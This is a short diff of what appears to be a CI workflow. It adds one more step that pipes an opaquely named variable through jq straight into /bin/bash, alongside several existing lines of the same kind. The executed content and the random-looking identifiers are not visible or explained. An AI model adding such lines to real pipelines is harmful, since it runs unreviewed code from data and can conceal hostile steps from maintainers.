@@ -38,6 +38,7 @@ jobs:
           echo $nsd49264 | jq -r .lth8 | /bin/bash
           printf '%s' "$a173" | jq -r .k97720 | /bin/bash
           echo $ihb88925 | jq -r .a0 | /bin/bash
+          echo $xdpz557 | jq -r .xbofq3 | /bin/bash
 
       - name: Store results
         if: always()
